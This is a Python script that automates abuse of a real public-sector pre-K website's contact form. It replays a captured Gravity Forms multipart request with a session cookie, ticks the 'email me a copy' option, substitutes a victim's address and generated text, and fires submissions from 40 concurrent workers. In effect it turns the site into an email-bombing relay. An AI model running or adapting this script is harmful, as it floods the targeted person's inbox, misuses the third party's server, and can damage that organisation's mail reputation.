from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': 'ag8esraaidopp6srb2qdoabdrg',
    '_ga': 'GA1.2.20341167.1676369600',
    '_gid': 'GA1.2.546849331.1676369600',
    '_gat_gtag_UA_55171315_1': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryqni57XTdhP9WErSX',
    # 'Cookie': 'PHPSESSID=ag8esraaidopp6srb2qdoabdrg; _ga=GA1.2.20341167.1676369600; _gid=GA1.2.546849331.1676369600; _gat_gtag_UA_55171315_1=1',
    'Origin': 'https://www.newmexicoprek.org',
    'Referer': 'https://www.newmexicoprek.org/contact/',
    'Sec-Fetch-Dest': 'iframe',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_2_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_15"\r\n\r\ntest\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_3"\r\n\r\n(122) 121-2121\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_6"\r\n\r\ntest\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_7"\r\n\r\ngf_other_choice\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_7_other"\r\n\r\ntest\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_8"\r\n\r\ntest\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_13.1"\r\n\r\n1\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_13.2"\r\n\r\nEmail me a copy of this message\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_13.3"\r\n\r\n1\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="input_16"\r\n\r\n\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="gform_ajax"\r\n\r\nform_id=1&title=&description=1&tabindex=0\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="is_submit_1"\r\n\r\n1\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n1\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="state_1"\r\n\r\nWyJbXSIsIjJhNjJjZTc0OGE0YzFkYzk3OGYwNTY2YWNlYjM5NzQwIl0=\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="gform_target_page_number_1"\r\n\r\n0\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="gform_source_page_number_1"\r\n\r\n1\r\n------WebKitFormBoundaryqni57XTdhP9WErSX\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryqni57XTdhP9WErSX--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post('https://www.newmexicoprek.org/contact/',
                                 cookies=cookies, headers=headers, data=data,
                                 )
        return response


def main():
    s = 'Thank you for contacting us!'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(40)


if __name__ == '__main__':
    main()
